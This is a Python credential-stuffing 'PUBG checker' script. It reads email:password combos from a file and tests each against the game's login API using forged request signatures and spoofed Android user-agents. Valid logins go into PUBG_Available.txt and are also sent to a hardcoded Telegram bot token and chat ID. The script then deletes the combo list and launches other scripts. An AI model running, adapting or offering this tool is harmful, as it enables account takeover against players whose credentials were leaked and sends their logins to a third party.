import requests
import hashlib
import random
import secrets
import colorama 
import uuid
import os
from time import sleep
import string
d = 0
print(f"""\x1b[32;1m

             _                  _               _             
            | |                | |             | |            
 _   _   _| |    _    _| |__   _  _| | _ _  
| '_ \| | | | '_ \ / _` |  / | '_ \ / _ \/ | |/ / _ \  '|
| |_) | |_| | |_) | (_| | | (__| | | |  / (|   <  / |   
| ./ \__,_|_.__/ \__, |  \___|_| |_|\___|\___|_|\_\___|_|   
| |                 / |                                     
|_|                |_/                                      

\x1b[39;1mDiv ==> @X888E    CH ==> @E999G 
""")
ID = '948449142'
token = '1706448122:AAEauXhifuALNv74ChxogexxnTbFnFn541M'
combos = open("acc.txt", "r").read().splitlines()
for combo in combos:
    try:
        combo = combo.split(":")
    except:
        print("Invalid Combo")
        exit()
    user = combo[0]
    passw = combo[1]
    bruted_text = f""" 𓆩Pubg Checker𓆪
    \n————————————————
    E-mail: {user}
    Pass: {passw}
    Div ==> @X888E    CH ==> @E999G ✓
    ————————————————\n"""
    token11 = hashlib.md5(bytes(f'{passw}', encoding='utf-8')).hexdigest()
    token22 = hashlib.md5(bytes(
        "/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=en_US&os=1{\"account\":\"" + user + "\",\"account_type\":2,\"area_code\":\"964\",\"extra_json\":\"\",\"password\":\"" + token11 + "\"}3ec8cd69d71b7922e2a17445840866b26d86e283",
        encoding="utf-8")).hexdigest()
    tokenpriv11 = ""
    for i in range(6):
        tokenpriv11 += "".join(random.choice(string.digits))
    tokenpriv11 += "."
    for i in range(3):
        tokenpriv11 += "".join(random.choice(string.digits))
    headers2 = {
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 10; RMX1971 Build/QKQ1.{tokenpriv11})",
        "Host": "igame.msdkpass.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate",
        "Content-Length": "122",
    }
    data2 = "{\"account\":\"" + user + "\",\"account_type\":2,\"area_code\":\"964\",\"extra_json\":\"\",\"password\":\"" + token11 + "\"}"
    r2 = requests.get(
        f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=en_US&os=1=sig={token22}",
        data=data2, headers=headers2)
    d += 1
    if "ret:2146" in r2.text:
        print(f"\x1b[32;1m[{d}]\x1b[32;1m [good]\x1b[37;1m {user}:{passw} ")
        with open("PUBG_Available.txt", "a") as m:
            m.write(bruted_text)
            requests.get(
                f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=•Eamil : {user}\n•Pass : {passw}\n ')
    elif '{"msg":"invalid sig", "ret":1008}' in r2.text:
        print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
    elif '"msg":"Params Email Format is Error!"' in r2.text:
        print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
    elif '"msg":"the account does not exists!"' in r2.text:
        print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
    elif '"msg":"wrong password!"' in r2.text:
        print(f"\x1b[31;1m[{d}]\x1b[31;1m [bad]\x1b[39;1m {user}:{passw} ")
os.system('rm -rif acc.txt')
os.system('python3 gen.py')
os.system('python3 checkerq.py')
